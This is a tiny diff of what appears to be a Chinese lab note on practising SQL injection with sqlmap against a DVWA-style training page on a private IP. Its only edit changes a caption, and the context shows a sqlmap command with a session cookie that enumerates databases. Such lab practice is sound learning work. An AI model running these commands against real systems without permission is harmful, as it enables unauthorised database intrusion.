@@ -10,7 +10,7 @@ sqlmap.py -u "http://193.168.10.26:81/vulnerabilities/sqli/?id=1&Submit=Submit#"
 
 
 
-加上cookie跑
+加上cookie再跑
 
 ```shell
 sqlmap.py -u "http://193.168.10.26:81/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=1elust7jg5psskq1k2un4gnp04; security=low" --dbs --flush-session
